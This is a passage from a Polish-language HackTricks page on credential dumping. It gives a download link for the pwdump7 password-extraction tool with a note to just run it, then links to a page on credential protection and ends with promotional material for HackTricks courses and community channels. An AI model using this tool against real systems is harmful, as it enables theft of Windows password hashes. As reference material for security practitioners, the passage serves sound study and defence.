Pobierz go z: [http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7) i po prostu **uruchom**, a hasła zostaną wyodrębnione.

## Obrona

[**Dowiedz się więcej o ochronie poświadczeń tutaj.**](credentials-protections.md)

<details>

<summary><strong>Naucz się hackowania AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć **reklamę swojej firmy w HackTricks** lub **pobrać HackTricks w formacie PDF** Sprawdź [**PLANY SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi trikami hakerskimi, przesyłając PR do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.

</details>
